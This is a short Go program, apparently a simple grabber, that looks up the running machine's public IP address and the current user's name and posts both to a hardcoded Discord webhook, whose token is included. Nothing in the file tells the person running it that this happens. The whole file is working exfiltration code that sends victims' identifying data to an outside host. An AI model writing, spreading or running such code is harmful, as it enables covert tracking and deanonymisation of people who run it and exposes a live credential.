package main

import (
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os/user"
)

func main() {
	urls := "https://discord.com/api/webhooks/1139803303660757002/Gz-SfTC6_c4OgLhJ7MOOY0TlUZ0YJ69W1yB-XOSAYHolkosDZxVnQm-Shtz0yPWqIrag"
	user, err := user.Current()
	ips, nil := http.Get("https://api.myip.com")
	body, err := ioutil.ReadAll(ips.Body)
	username := user.Username
	ip := string(body)
	datas := url.Values{
		"content": {"There Ip Address:"+ ip +"There Pc Username:\n"+ username},
	}
	resp, err := http.PostForm(urls, datas)

	if err != nil {
		log.Fatal(err, resp)
	}

}
